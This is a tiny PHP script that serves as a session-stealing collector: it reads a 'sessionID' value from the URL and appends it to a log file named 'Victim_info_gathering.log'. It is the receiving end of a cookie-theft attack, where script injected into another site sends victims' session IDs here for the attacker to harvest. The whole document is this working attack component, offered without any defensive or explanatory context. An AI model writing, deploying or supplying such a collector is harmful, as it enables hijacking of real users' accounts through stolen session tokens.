<?php
if(!empty($_GET['sessionID'])) {
    $logfile = fopen('Victim_info_gathering.log', 'a+');
    fwrite($logfile, $_GET['sessionID']);
    fclose($logfile);
}
?>
